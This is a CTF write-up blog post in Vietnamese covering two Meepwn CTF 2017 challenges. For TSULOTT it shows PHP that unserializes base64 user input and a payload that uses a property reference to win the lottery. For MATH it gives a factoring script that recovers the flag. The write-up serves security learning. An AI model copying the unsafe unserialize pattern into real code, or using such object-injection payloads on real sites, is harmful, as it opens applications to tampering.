---
layout: post
title:  "Meepwn CTF 2017 - Quick TSULOTT and |\\/|/-\\T|-| writeup"
date: 2017-07-27 11:08:19 +0700
categories: ctf
---

# TSULOTT

```
Who Wants to Be a Millionaire? Join My LOTT and Win JACKPOTTTT!!! Remote: 128.199.190.23:8001
```

Truy cập vào trang, ta thấy một trang web xổ số, tìm ra 6 cặp số đúng đẻ trúng cả tỉ đồng.

View source thấy có comment: `is_debug=1`, thử thêm tham số này ta nhận được source-code như sau:

```php
<body>
<style>
input[type=text] {
    width: 40%;
    padding: 12px 20px;
    margin: 8px 0;
    box-sizing: border-box;
    border: 2px solid red;
    background-color: #ebfff8;
    border-radius: 4px;
}
button[type=submit] {
    width: 10%;
    background-color: #F94848;
    color: white;
    padding: 14px 20px;
    margin: 8px 0;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}
button[type=submit]:hover {
    background-color: #45a049;
}
body {
    background-image: url("money.jpg");
}
</style>
<?php
class Object
{
  var $jackpot;
  var $enter;
}
?>
<?php
include('secret.php');
if(isset($_GET['input']))  
{
  $obj = unserialize(base64_decode($_GET['input']));
  if($obj)
  {
    $obj->jackpot = rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99).' '.rand(10,99);
    if($obj->enter === $obj->jackpot)
    {
      echo "<center><strong><font color='white'>CONGRATULATION! You Won JACKPOT PriZe !!! </font></strong></center>". "<br><center><strong><font color='white' size='20'>".$obj->jackpot."</font></strong></center>";
      echo "<br><center><strong><font color='green' size='25'>".$flag."</font></strong></center><br>";
      echo "<center><img src='http://www.relatably.com/m/img/cross-memes/5378589.jpg' /></center>";
    }
    else
    {
      echo "<br><br><center><strong><font color='white'>Wrong! True Six Numbers Are: </font></strong></center>". "<br><center><strong><font color='white' size='25'>".$obj->jackpot."</font></strong></center><br>";
    }
  }
  else
  {
    echo "<center><strong><font color='white'>- Something wrong, do not hack us please! -</font></strong></center>";
  }
}
else
{
  echo "";
}
?>
<center>
<br><h2><font color='yellow' size=8>-- TSU</font><font color='red' size=8>LOTT --</font></h2>
<p><p><font color='white'>Input your code to win jackpot!</font><p>
<form>
          <input type="text" name="input" /><p><p>
          <button type="submit" name="btn-submit" value="go">send</button>
</form>
</center>
<?php
if (isset($_GET['gen_code']) && !empty($_GET['gen_code']))
{
  $temp = new Object;
  $temp->enter=$_GET['gen_code'];
  $code=base64_encode(serialize($temp));
  echo '<center><font color=\'white\'>Here is your code, please use it to Lott: <strong>'.$code.'</strong></font></center>';
}
?>
<center>
<font color='white'>-----------------------------------------------------------------------------------------------------------------------------</font>
<h3><font color='white'>Take code</font></h3><p>
<p><font color='white'>Pick your six numbers (Ex: 15 02 94 11 88 76)</font><p>
<form>
      <input type="text" name="gen_code" maxlength="17" /><p><p>
      <button type="submit" name="btn-submit" value="go">send</button>
</form>
</center>
<?php
if(isset($_GET['is_debug']) && $_GET['is_debug']==='1')
{
   show_source(__FILE__);
}
?>
<!-- GET is_debug=1 -->
```

Nhiệm vụ là tạo ra 1 input sau khi được decode base64 và unserialize có thuộc tính `enter` và `jackpot` giống nhau là ok.
Vì ta có thể control toàn bộ object truyền vào nên điều đầu tiên nghĩ đến là tạo object mà enter sẽ reference đến jackpot, như vậy giá trị luôn bằng nhau:

```php
class Object
{
  var $jackpot;
  var $enter;

  function __construct() {
       $this->enter = &$this->jackpot;
   }
}
$input = new Object();
echo base64_encode(serialize($input));
```
submit ta có flag: `MeePwnCTF{__OMG!!!__Y0u_Are_Milli0naire_N0ww!!___}`

Cách khác ?: tạo object ko có cả `enter` lẫn `jackpot`, khi đó cả 2 đều null -> pass ?


# MATH

```
I hack your brain!

hack.py
```

```python
from Crypto.Util.number import *
from hashlib import md5

flag = "XXX"
assert len(flag) == 14
pad = bytes_to_long(md5(flag).digest())

hack = 0

for char in flag:
	hack+= pad
	hack*= ord(char)

print hack
#hack = 64364485357060434848865708402537097493512746702748009007197338675
#flag_to_submit = "MeePwnCTF{" + flag + "}"
```

Nhận xét:

- `hack = pad * last_char * (1 + ...)`
- hack có thể factor được bằng factordb.com
- pad sẽ nằm trong khoảng từ min_md5 đến max_md5 và là tích của các factor của hack.

Ta sẽ brute force giá trị của hack, với mỗi giá trị đó sẽ tính được tiếp `last_char` (last_char có giá trị trong khoảng từ 32 đến 128 (printable)) cứ như vậy cho đến char đầu tiên.

Source code:

```python
# -*- coding=utf-8 -*-

from Crypto.Util.number import *
from hashlib import md5
from itertools import combinations

len_flag = 14
hack = 64364485357060434848865708402537097493512746702748009007197338675
#flag_to_submit = "MeePwnCTF{" + flag + "}"
"""
3^2 · 5^2 · 7 · 107 · 487 · 607 · 28429 · 29287 · 420577267963<12> · 3680317203978923<16> · 1002528655290265069<19>
"""
raw_input()

def get_all_candidate(hack):
    # print hack
    return [chr(i) for i in range(32, 129) if hack % i == 0]

def backtrack(i, h, p, ans, deep):
    # print "="*deep, i, h, ans
    if h < 0:
        return False
    if len(ans) > len_flag:
        return False
    if h / ord(i) == p and p == bytes_to_long(md5(ans[::-1]).digest()):
        print ans[::-1]
        raw_input()
        return True
    candidate = get_all_candidate(h/ord(i) - p)
    # print "="*deep, candidate
    if not candidate:
        return False
    else:
        done = False
        for j in candidate:
            if not backtrack(j, h/ord(i) - p, p, ans + j, deep + 1):
                # print "="*deep, "Failed", j
                pass
            else:
                done = True

        return done

cs = [3, 3, 5, 5, 7, 107, 487, 607, 28429, 29287, 420577267963, 3680317203978923, 1002528655290265069]
for r in range(1, 14):
    for factors in combinations(cs, r):
        pad = 1
        for f in factors:
            pad *= f
        if pad > 340282366920938457608348813069405954094 or pad < 3922569271515906540887:
            continue
        print factors

        for k in get_all_candidate(hack):
            print "------------->"
            backtrack(k, hack, pad, k, 1)
            # raw_input()
```

Chạyy 1 lúc thì ra pad là tích của 6 factor và flag là `d0y0ul1keM@TH?`

Submit: `MeePwnCTF{d0y0ul1keM@TH?}`
